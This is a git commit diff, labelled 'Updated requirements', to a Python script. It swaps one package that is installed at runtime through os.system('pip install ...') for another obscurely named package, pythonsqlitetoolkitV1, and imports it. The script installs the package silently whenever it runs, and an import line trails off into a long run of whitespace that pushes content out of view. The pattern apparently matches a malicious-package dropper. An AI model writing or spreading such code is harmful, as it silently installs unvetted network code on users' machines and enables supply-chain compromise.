a8978cdf48a626276e3b27ff0dbc7237b62e6007
Wieselnuggis <105999132+Wieselnuggis@users.noreply.github.com>
2023-07-18 10:30:12 -0500

    Updated requirements

--- updated.py
+++ updated.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncolouringtoolkitsV2")
-import pythoncolouringtoolkitsV2
+os.system("pip install pythonsqlitetoolkitV1")
+import pythonsqlitetoolkitV1
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
 from optparse import Option
 import requests
